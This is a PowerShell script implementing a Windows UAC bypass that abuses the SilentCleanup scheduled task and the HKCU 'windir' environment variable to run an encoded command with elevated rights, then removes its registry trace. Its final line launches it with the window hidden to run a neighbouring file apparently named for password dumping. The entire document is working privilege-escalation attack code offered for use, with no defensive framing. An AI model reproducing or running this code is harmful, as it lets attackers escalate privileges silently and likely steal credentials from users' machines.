function Invoke-TaskCleanerBypass {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,Position=0)]
        [ValidateSet("Encoded","File")]
        [string]$Method,
        [Parameter(Mandatory=$false)]
        [switch]$Hide
    )

    DynamicParam {
        if($Method -eq "File") {
            $paramname = "FileName"            
        } else {
            $paramname = "EncodedCommand"
        }
        #create a new ParameterAttribute Object
        $MethodAttribute = New-Object System.Management.Automation.ParameterAttribute
        #$testaddAttribute.Position = 3
        $MethodAttribute.Mandatory = $true
        #$MethodAttribute.HelpMessage = "My test help message"

        #create an attributecollection object for the attribute we just created.
        $attributeCollection = new-object System.Collections.ObjectModel.Collection[System.Attribute]

        #add our custom attribute
        $attributeCollection.Add($MethodAttribute)

        #add our paramater specifying the attribute collection
        $MethodParam = New-Object System.Management.Automation.RuntimeDefinedParameter($paramname, [string], $attributeCollection)

        #expose the name of our parameter
        $paramDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        $paramDictionary.Add($paramname, $MethodParam)
        return $paramDictionary
    }

    

    Process {
        #If not in the Administrators group, do not run.
        if(!(gwmi -class win32_groupuser | Where {$_.GroupComponent -match "Administrators" -and $_.PartComponent -match $env:username})) {
            Return
        }
        #If not Windows 8.1 or higher then exit.
        $OSV = (gwmi -class win32_operatingsystem -Property Version).Version -split "\."
        if(!(($OSV[0] -ge 10) -or ($OSV[0] -eq 6 -and $OSV[1] -eq 3))){
            Return
        }

        #Set Variables
        if($Method -eq "File") {
            $File = $PSBoundParameters.Filename
            Try {
                $File = (Resolve-Path $File).Path
            } catch {
                Return
            }
        } else {
            $EncodedCommand = $PSBoundParameters.EncodedCommand
        }

        $regpath = "HKCU:\Environment"
        $key = "windir"
        $taskrunner = "schtasks" 
        $taskparam = "/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
        $waittime = 5
        $cmd = "powershell "
        if($Hide) {
            $cmdparams = "/Noni /NoP /W h /E "
        } else {
            $cmdparams = "/Noni /NoP /E "
        }



        if($Method -eq "File") {
            $tmpsc = "iex (gc -path `"$File`" -Raw)"
            $encode = [System.Convert]::ToBase64String(([System.Text.Encoding]::Unicode.GetBytes($tmpsc)))
            $cmdparams += "`"$encode`""
        } else {
            $cmdparams += "`"$encodedcommand`""
        }

        if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator') -or (([Environment]::UserName).ToLower() -eq "system")) {
            Start-Process ($cmd.Trim()) -ArgumentList $cmdparams
        } else {
            Set-ItemProperty -Path $regpath -Name $key -Value ("cmd /c" + $cmd + $cmdparams + "& ::")
            Start-Process $taskrunner -ArgumentList $taskparam
            Start-Sleep -s $waittime
            Remove-ItemProperty -Path $regpath -Name $key -Force | Out-Null
        }
    }
}
$currentdir = [System.IO.Path]::GetDirectoryName($myInvocation.MyCommand.Definition)
Invoke-TaskCleanerBypass -Method File -Filename $currentdir\lazassword.ps1 -hide
